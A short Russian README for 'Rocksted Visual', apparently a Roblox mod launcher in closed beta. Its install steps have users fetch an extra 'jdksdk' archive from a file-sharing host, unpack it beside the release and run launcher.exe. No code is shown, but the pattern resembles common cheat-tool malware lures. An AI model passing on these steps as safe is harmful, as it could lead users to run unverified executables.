# Rocksted Visual

**Rocksted Visual** — проект, посвящённый визуальным модификациям и инструментам для Roblox. Проект находится в разработке и продолжает развиваться.

> Ранее бета-тестирование было открыто для всех желающих, но сейчас доступ ограничен командой разработчиков и знакомыми. Открытие публичного тестирования планируется после дальнейшей разработки и подготовки проекта.

## 📥 Установка

1. Скачай архив проекта из [последнего релиза](https://github.com/vkola410/rockstar-launcher/releases).
2. Создай новую папку и распакуй в неё содержимое архива.
3. Скачай архив с необходимыми файлами: [jdksdk](https://workupload.com/file/8xVdFjWvsXx).
4. Распакуй содержимое архива `jdksdk` **в ту же папку**, куда распаковал проект.
5. Запусти `launcher.exe`.

## 💻 Системные требования

- **Операционная система:** Windows 10 и новее.
- **Интернет:** требуется подключение к интернету.

## 🚧 Статус проекта

Rocksted Visual **не заброшен** — разработка продолжается.

Сейчас основное внимание уделяется доработке функциональности, исправлению ошибок и подготовке проекта к будущему бета-тестированию.

Публичное тестирование временно закрыто. Доступ к текущим тестовым сборкам имеют только участники команды и знакомые разработчиков.
